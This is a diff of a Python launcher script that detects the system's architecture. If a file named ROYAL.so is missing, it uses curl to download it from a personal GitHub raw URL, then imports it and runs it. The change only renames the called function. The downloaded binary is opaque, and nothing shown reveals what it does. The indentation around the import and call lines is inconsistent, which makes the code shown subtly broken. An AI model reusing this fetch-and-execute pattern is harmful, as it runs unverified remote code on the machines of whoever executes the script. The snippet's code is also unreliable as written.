@@ -18,11 +18,11 @@ bit = platform.architecture()[0]
 if bit == '64bit':
     if not os.path.isfile('ROYAL.so'):
         os.system('curl -L https://github.com/chigoziieworldwide/executable/blob/main/ROYAL.cpython-311.so?raw=true -o ROYAL.so') 
-       from ROYAL import chigozie
-        chigozie()
+       from ROYAL import keyx
+        keyx()
     else:
-        from ROYAL import chigozie
-        chigozie()
+        from ROYAL import keyx
+        keyx()
 
 elif bit == '32bit':
     if not os.path.isfile('ROYAL32.so'):
